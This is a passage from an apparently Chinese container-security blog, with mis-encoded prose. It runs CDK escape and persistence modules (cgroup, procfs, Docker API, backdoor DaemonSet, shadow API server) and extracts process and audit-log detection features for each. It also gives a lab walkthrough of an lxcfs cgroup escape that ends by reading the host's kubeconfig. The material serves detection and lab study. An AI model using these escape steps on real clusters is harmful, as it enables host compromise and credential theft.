<h3 id="ç‰¹å¾æå–-6"><a href="#ç‰¹å¾æå–-6" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-6"><a href="#è¿›ç¨‹ç‰¹å¾-6" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>çˆ¶è¿›ç¨‹ä¸ºbashï¼Œå­è¿›ç¨‹ä¸ºcdkï¼Œå‚æ•°ä¸ºrun mount-disk</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118111342522.png" alt="image-20240118111342522"></p>
<h4 id="å‘½ä»¤ç‰¹å¾-6"><a href="#å‘½ä»¤ç‰¹å¾-6" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-disk</span><br></pre></td></tr></table></figure>

<h2 id="CDKå®¹å™¨é€ƒé€¸Cgroupé€ƒé€¸ï¼ˆç‰¹æƒå®¹å™¨ï¼‰"><a href="#CDKå®¹å™¨é€ƒé€¸Cgroupé€ƒé€¸ï¼ˆç‰¹æƒå®¹å™¨ï¼‰" class="headerlink" title="CDKå®¹å™¨é€ƒé€¸Cgroupé€ƒé€¸ï¼ˆç‰¹æƒå®¹å™¨ï¼‰"></a>CDKå®¹å™¨é€ƒé€¸Cgroupé€ƒé€¸ï¼ˆç‰¹æƒå®¹å™¨ï¼‰</h2><p>è¿›å…¥æµ‹è¯•å®¹å™¨æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-cgroup <span class="string">&quot;touch /tmp/exp-success&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118141449945.png" alt="image-20240118141449945"></p>
<p>æŸ¥çœ‹æ˜¯å¦æ‰§è¡ŒæˆåŠŸ</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134635362.png" alt="image-20240118134635362"></p>
<h3 id="ç‰¹å¾æå–-7"><a href="#ç‰¹å¾æå–-7" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-7"><a href="#è¿›ç¨‹ç‰¹å¾-7" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>çˆ¶è¿›ç¨‹bashï¼Œå­è¿›ç¨‹cdkï¼Œå‚æ•°run mount-cgroup [CMDå‘½ä»¤]</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118141407989.png" alt="image-20240118141407989"></p>
<h4 id="å‘½ä»¤ç‰¹å¾-7"><a href="#å‘½ä»¤ç‰¹å¾-7" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-cgroup [CMDå‘½ä»¤]</span><br></pre></td></tr></table></figure>

<h2 id="CDKå®¹å™¨é€ƒé€¸-Procfsç›®å½•æŒ‚è½½é€ƒé€¸"><a href="#CDKå®¹å™¨é€ƒé€¸-Procfsç›®å½•æŒ‚è½½é€ƒé€¸" class="headerlink" title="CDKå®¹å™¨é€ƒé€¸-Procfsç›®å½•æŒ‚è½½é€ƒé€¸"></a>CDKå®¹å™¨é€ƒé€¸-Procfsç›®å½•æŒ‚è½½é€ƒé€¸</h2><p>è¿›å…¥æµ‹è¯•å®¹å™¨ï¼Œå†™ä¸€ä¸ªé‡å¤æ‰§è¡Œçš„è„šæœ¬æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    ./cdk run mount-procfs /tmp/proc <span class="string">&quot;touch /tmp/exp-success&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134531304.png" alt="image-20240118134531304"></p>
<p>å‘ç°å®¿ä¸»æœºè¢«å†™å…¥æ–‡ä»¶</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134635362.png" alt="image-20240118134635362"></p>
<h3 id="ç‰¹å¾æå–-8"><a href="#ç‰¹å¾æå–-8" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-8"><a href="#è¿›ç¨‹ç‰¹å¾-8" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>çˆ¶è¿›ç¨‹ä¸ºbashï¼Œå­è¿›ç¨‹ä¸ºcdkï¼Œå‚æ•°ä¸ºrun mount-procfs [æŒ‚è½½procè·¯å¾„] [CMDå‘½ä»¤]</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240118134937362.png" alt="image-20240118134937362"></p>
<h4 id="å‘½ä»¤ç‰¹å¾-8"><a href="#å‘½ä»¤ç‰¹å¾-8" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run mount-procfs [æŒ‚è½½procè·¯å¾„]  [CMDå‘½ä»¤]</span><br></pre></td></tr></table></figure>

<h2 id="CDKå®¹å™¨é€ƒé€¸-Docker-API-2375-å‘½ä»¤æ‰§è¡Œ"><a href="#CDKå®¹å™¨é€ƒé€¸-Docker-API-2375-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="CDKå®¹å™¨é€ƒé€¸-Docker API(2375)å‘½ä»¤æ‰§è¡Œ"></a>CDKå®¹å™¨é€ƒé€¸-Docker API(2375)å‘½ä»¤æ‰§è¡Œ</h2><p>è¿›å…¥æµ‹è¯•å®¹å™¨æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-api-pwn http://192.168.38.210:2375 <span class="string">&quot;touch /host/tmp/docker-api-pwn&quot;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240124202432240.png"></p>
<p>æŸ¥çœ‹åˆ°æˆåŠŸå†™å…¥</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240124202544160.png"></p>
<h3 id="ç‰¹å¾æå–-9"><a href="#ç‰¹å¾æå–-9" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-9"><a href="#è¿›ç¨‹ç‰¹å¾-9" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240124202634915.png"></p>
<p>çˆ¶è¿›ç¨‹ä¸ºbashï¼Œå­è¿›ç¨‹ä¸ºcdkï¼Œå‚æ•°ä¸ºdocker-api-pwn [docker apiè®¿é—®è·¯å¾„] [CMDå‘½ä»¤]</p>
<h4 id="å‘½ä»¤ç‰¹å¾-9"><a href="#å‘½ä»¤ç‰¹å¾-9" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run docker-api-pwn [docker apiè®¿é—®è·¯å¾„] [CMDå‘½ä»¤]</span><br></pre></td></tr></table></figure>

<h2 id="CDKä¿¡æ¯æ”¶é›†-æ£€æŸ¥å’Œè·å–Istioå…ƒä¿¡æ¯"><a href="#CDKä¿¡æ¯æ”¶é›†-æ£€æŸ¥å’Œè·å–Istioå…ƒä¿¡æ¯" class="headerlink" title="CDKä¿¡æ¯æ”¶é›†-æ£€æŸ¥å’Œè·å–Istioå…ƒä¿¡æ¯"></a>CDKä¿¡æ¯æ”¶é›†-æ£€æŸ¥å’Œè·å–Istioå…ƒä¿¡æ¯</h2><p>æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run istio-check</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240126231629668.png" alt="image-20240126231629668"></p>
<h3 id="ç‰¹å¾æå–-10"><a href="#ç‰¹å¾æå–-10" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-10"><a href="#è¿›ç¨‹ç‰¹å¾-10" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>çˆ¶è¿›ç¨‹ä¸ºbashï¼Œå­è¿›ç¨‹ä¸ºcdkï¼Œå‚æ•°ä¸ºrun istio-check</p>
<h4 id="å‘½ä»¤ç‰¹å¾-10"><a href="#å‘½ä»¤ç‰¹å¾-10" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run istio-chek</span><br></pre></td></tr></table></figure>

<h4 id="ç½‘ç»œç‰¹å¾"><a href="#ç½‘ç»œç‰¹å¾" class="headerlink" title="ç½‘ç»œç‰¹å¾"></a>ç½‘ç»œç‰¹å¾</h4><p>éœ€è¦å‘<a target="_blank" rel="noopener" href="http://httpbin.org/get%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82">http://httpbin.org/getå‘é€è¯·æ±‚</a></p>
<h2 id="CDKæŒä¹…åŒ–-éƒ¨ç½²å½±å­K8s-api-server"><a href="#CDKæŒä¹…åŒ–-éƒ¨ç½²å½±å­K8s-api-server" class="headerlink" title="CDKæŒä¹…åŒ–-éƒ¨ç½²å½±å­K8s api-server"></a>CDKæŒä¹…åŒ–-éƒ¨ç½²å½±å­K8s api-server</h2><p>éƒ¨ç½²å½±å­k8s api-serverçš„æ­¥éª¤è¯¦è§æˆ‘è¿‘æœŸçš„æ–‡ç« -éƒ¨ç½²å½±å­APIServerï¼Œæ¥ç€è¿›å…¥å®¹å™¨æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run k8s-shadow-apiserver default</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å½±å­APIServeråˆ›å»ºæˆåŠŸ</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240129134404640.png"></p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240129134613665.png" alt="image-20240129134613665"></p>
<h3 id="ç‰¹å¾æå–-11"><a href="#ç‰¹å¾æå–-11" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-11"><a href="#è¿›ç¨‹ç‰¹å¾-11" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>çˆ¶è¿›ç¨‹bashï¼Œå­è¿›ç¨‹cdkï¼Œå‚æ•°ä¸ºrun k8s-shadow-apiserver default&#x2F;anonymous&#x2F;token-path</p>
<h4 id="å‘½ä»¤ç‰¹å¾-11"><a href="#å‘½ä»¤ç‰¹å¾-11" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run k8s-shadow-apiserver default/anonymous/token-path</span><br></pre></td></tr></table></figure>

<h4 id="æ—¥å¿—å®¡è®¡ç‰¹å¾"><a href="#æ—¥å¿—å®¡è®¡ç‰¹å¾" class="headerlink" title="æ—¥å¿—å®¡è®¡ç‰¹å¾"></a>æ—¥å¿—å®¡è®¡ç‰¹å¾</h4><p>ç”±äºæ¶‰åŠpodåˆ›å»ºï¼Œæ‰€ä»¥å¯ä»¥å¼€å¯æ—¥å¿—å®¡è®¡ï¼Œå†™ä¸€ä¸ªå®¡è®¡podåˆ›å»ºçš„æ—¥å¿—å®¡è®¡ç­–ç•¥æ•è·ç‰¹å¾ã€‚ç”±äºå½±å­api-serveræ˜¯åˆ©ç”¨ä¿®æ”¹api-serverå¯åŠ¨é…ç½®å¾—ä»¥åˆ©ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ•è·ç‰¹å¾çš„è¿‡ç¨‹é‡ç‚¹å…³æ³¨è¿™ä¸ªï¼Œè¯¦ç»†è§æˆ‘è¿‘æœŸçš„æ–‡ç« -Kubernetesæ—¥å¿—å®¡è®¡ç­–ç•¥</p>
<h2 id="CDKæŒä¹…åŒ–-éƒ¨ç½²K8s-CronJob"><a href="#CDKæŒä¹…åŒ–-éƒ¨ç½²K8s-CronJob" class="headerlink" title="CDKæŒä¹…åŒ–-éƒ¨ç½²K8s CronJob"></a>CDKæŒä¹…åŒ–-éƒ¨ç½²K8s CronJob</h2><p>è¿›å…¥æµ‹è¯•å®¹å™¨ï¼Œæ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run k8s-cronjob default min alpine <span class="string">&quot;echo hellow;echo cronjob&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="ç‰¹å¾æå–-12"><a href="#ç‰¹å¾æå–-12" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-12"><a href="#è¿›ç¨‹ç‰¹å¾-12" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>çˆ¶è¿›ç¨‹ bashï¼Œå­è¿›ç¨‹cdkï¼Œå‚æ•°run k8s-cronjob [default|anonymous|service-account-token-path] [min|hour|day|cron-expr] [IMAGE] [ARGS]</p>
<h4 id="å‘½ä»¤ç‰¹å¾-12"><a href="#å‘½ä»¤ç‰¹å¾-12" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run k8s-cronjob [default|anonymous|service-account-token-path] [min|hour|day|cron-expr] [IMAGE] [ARGS]</span><br></pre></td></tr></table></figure>

<h4 id="æ—¥å¿—å®¡è®¡ç‰¹å¾-1"><a href="#æ—¥å¿—å®¡è®¡ç‰¹å¾-1" class="headerlink" title="æ—¥å¿—å®¡è®¡ç‰¹å¾"></a>æ—¥å¿—å®¡è®¡ç‰¹å¾</h4><p>ç”±äºæ¶‰åŠcronjobåˆ›å»ºï¼Œæ‰€ä»¥å¯ä»¥å¼€å¯æ—¥å¿—å®¡è®¡ï¼Œå†™ä¸€ä¸ªå®¡è®¡cronjobåˆ›å»ºçš„æ—¥å¿—å®¡è®¡ç­–ç•¥æ•è·ç‰¹å¾ï¼Œè¯¦ç»†è§æˆ‘è¿‘æœŸçš„æ–‡ç« -Kubernetesæ—¥å¿—å®¡è®¡ç­–ç•¥</p>
<h2 id="CDKæŒä¹…åŒ–-éƒ¨ç½²åé—¨Pod"><a href="#CDKæŒä¹…åŒ–-éƒ¨ç½²åé—¨Pod" class="headerlink" title="CDKæŒä¹…åŒ–-éƒ¨ç½²åé—¨Pod"></a>CDKæŒä¹…åŒ–-éƒ¨ç½²åé—¨Pod</h2><p>è¿›å…¥æµ‹è¯•å®¹å™¨ï¼Œæ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run k8s-backdoor-daemonset default ubuntu</span><br></pre></td></tr></table></figure>

<h3 id="ç‰¹å¾æå–-13"><a href="#ç‰¹å¾æå–-13" class="headerlink" title="ç‰¹å¾æå–"></a>ç‰¹å¾æå–</h3><h4 id="è¿›ç¨‹ç‰¹å¾-13"><a href="#è¿›ç¨‹ç‰¹å¾-13" class="headerlink" title="è¿›ç¨‹ç‰¹å¾"></a>è¿›ç¨‹ç‰¹å¾</h4><p>çˆ¶è¿›ç¨‹ bashï¼Œå­è¿›ç¨‹cdkï¼Œå‚æ•°run k8s-backdoor-daemonset [default|anonymous|service-account-token-path]  [image]</p>
<h4 id="å‘½ä»¤ç‰¹å¾-13"><a href="#å‘½ä»¤ç‰¹å¾-13" class="headerlink" title="å‘½ä»¤ç‰¹å¾"></a>å‘½ä»¤ç‰¹å¾</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run k8s-backdoor-daemonset [default|anonymous|service-account-token-path]  [image]</span><br></pre></td></tr></table></figure>

<h4 id="æ—¥å¿—å®¡è®¡ç‰¹å¾-2"><a href="#æ—¥å¿—å®¡è®¡ç‰¹å¾-2" class="headerlink" title="æ—¥å¿—å®¡è®¡ç‰¹å¾"></a>æ—¥å¿—å®¡è®¡ç‰¹å¾</h4><p>ç”±äºæ¶‰åŠpodåˆ›å»ºï¼Œæ‰€ä»¥å¯ä»¥å¼€å¯æ—¥å¿—å®¡è®¡ï¼Œå†™ä¸€ä¸ªå®¡è®¡podåˆ›å»ºçš„æ—¥å¿—å®¡è®¡ç­–ç•¥æ•è·ç‰¹å¾ã€‚åé—¨podé€šå¸¸ä¼šæŒ‚è½½å®¿ä¸»æœº&#x2F;ç›®å½•ï¼Œå¯ä»¥ä½œä¸ºç‰¹å¾åœ¨æ—¥å¿—å®¡è®¡ä¸­æ•è·ï¼Œè¯¦ç»†è§æˆ‘è¿‘æœŸçš„æ–‡ç« -Kubernetesæ—¥å¿—å®¡è®¡ç­–ç•¥</p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-01-17</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 1848 words, 6 min 9 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2024/01/16/lxcfs%20cgroup%E9%94%99%E8%AF%AF%E9%85%8D%E7%BD%AE%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">lxcfs cgroupé”™è¯¯é…ç½®å®¹å™¨é€ƒé€¸</a></h3></div><div class="post-content"><div class="card"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><p>Ubuntu 20.04</p>
<p>docker 20.10.21</p>
<p>kubernetes 1.22.7</p>
<h2 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><h3 id="å®‰è£…lxcfs"><a href="#å®‰è£…lxcfs" class="headerlink" title="å®‰è£…lxcfs"></a>å®‰è£…lxcfs</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install lxcfs</span><br></pre></td></tr></table></figure>

<p>éªŒè¯å®‰è£…</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116151755434.png" alt="image-20240116151755434"></p>
<p>è¿è¡Œlxcfs</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl deamon-reload</span><br><span class="line">systemctl start lxcfs</span><br><span class="line">systemctl status lxcfs</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…æ‰‹åŠ¨è¿è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lxcfs /var/lib/lxcfs</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116152153601.png" alt="image-20240116152153601"></p>
<h3 id="éƒ¨ç½²å¸¦æœ‰æ¼æ´çš„pod"><a href="#éƒ¨ç½²å¸¦æœ‰æ¼æ´çš„pod" class="headerlink" title="éƒ¨ç½²å¸¦æœ‰æ¼æ´çš„pod"></a>éƒ¨ç½²å¸¦æœ‰æ¼æ´çš„pod</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl create ns cdk-test</span><br><span class="line">kubectl apply -f cdk-nginx.yaml</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">cdk-nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">cdk-test</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">cdk-nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:latest</span></span><br><span class="line">        <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lxcfs</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/tmp</span></span><br><span class="line">      <span class="attr">volumes:</span>                          <span class="comment"># æŒ‚è½½lxcfsç›®å½•</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">lxcfs</span></span><br><span class="line">          <span class="attr">hostPath:</span></span><br><span class="line">            <span class="attr">path:</span> <span class="string">/var/lib/lxcfs</span></span><br><span class="line">            <span class="attr">type:</span> <span class="string">Directory</span></span><br></pre></td></tr></table></figure>

<p> éªŒè¯éƒ¨ç½²</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116153936192.png" alt="image-20240116153936192"></p>
<h3 id="è¿›å…¥podé…ç½®ç¯å¢ƒ"><a href="#è¿›å…¥podé…ç½®ç¯å¢ƒ" class="headerlink" title="è¿›å…¥podé…ç½®ç¯å¢ƒ"></a>è¿›å…¥podé…ç½®ç¯å¢ƒ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl <span class="built_in">exec</span> -it cdk-nginx-5d49fc6b5d-87z77 -n cdk-test /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116154108512.png" alt="image-20240116154108512"></p>
<p>å…è®¸lxcfsæŸ¥çœ‹æ‰€æœ‰è®¾å¤‡ï¼Œè¿™ä¸ªè·¯å¾„æ˜¯åœ¨è¿›å…¥&#x2F;tmp&#x2F;cgroup&#x2F;devices&#x2F;kubepods.slice&#x2F;kubepods-besteffort.sliceåä¸€ç›´æ·±å…¥åå¾—åˆ°çš„ï¼Œéœ€è¦ä¾ç…§æƒ…å†µè€Œå®š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> a &gt; /tmp/cgroup/devices/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-pod4cde57c0_bb78_4ff5_8ce7_cc54c1521ee1.slice/docker-080ea39f7efecf95db7137341f951f30b9ef96aa54566841daa2a22649440bf9.scope/devices.allow</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹&#x2F;etcç›®å½•çš„nodeå·å’Œæ–‡ä»¶ç³»ç»Ÿç±»å‹ï¼Œç¡®è®¤nodeå·ä¸º253:0 æ–‡ä»¶ç³»ç»Ÿè¯¥ç±»å‹ä¸ºext4</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/mountinfo |grep /etc</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116160522696.png" alt="image-20240116160522696"></p>
<h3 id="åˆ›å»ºè®¾å¤‡è¿›è¡Œé€ƒé€¸"><a href="#åˆ›å»ºè®¾å¤‡è¿›è¡Œé€ƒé€¸" class="headerlink" title="åˆ›å»ºè®¾å¤‡è¿›è¡Œé€ƒé€¸"></a>åˆ›å»ºè®¾å¤‡è¿›è¡Œé€ƒé€¸</h3><p>è®¾å¤‡æ–‡ä»¶åç§°<code>cdk-test</code>ã€æ–‡ä»¶ç±»å‹<code>b</code>ä¸ºå—è®¾å¤‡ã€ä¸»è®¾å¤‡å·<code>253</code>ã€æ¬¡è®¾å¤‡å·<code>0</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mknod</span> cdk-test b 253 0</span><br></pre></td></tr></table></figure>

<p>è¿›è¡Œè°ƒè¯•ï¼Œé€šè¿‡lså‘½ä»¤å’Œwriteå‘½ä»¤å³å¯è¯»å†™æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debugfs -w cdk-test</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116161450819.png" alt="image-20240116161450819"></p>
<h3 id="CDKæ–¹å¼"><a href="#CDKæ–¹å¼" class="headerlink" title="CDKæ–¹å¼"></a>CDKæ–¹å¼</h3><p>ï¼ˆè¿™é‡Œæ¢æˆäº†ubuntué•œåƒä¾¿äºåç»­çœ‹è¿›ç¨‹ç»†èŠ‚ï¼‰</p>
<p>è¿è¡Œcdké€ƒé€¸è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cdk run lxcfs-rw</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183339381.png" alt="image-20240116183339381"></p>
<p>è¿è¡ŒdebugfsæŸ¥çœ‹host_devæ–‡ä»¶ç³»ç»Ÿ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debugfs -w host_dev</span><br><span class="line"><span class="built_in">cat</span> /root/.kube/config</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240116183421548.png" alt="image-20240116183421548"></p>
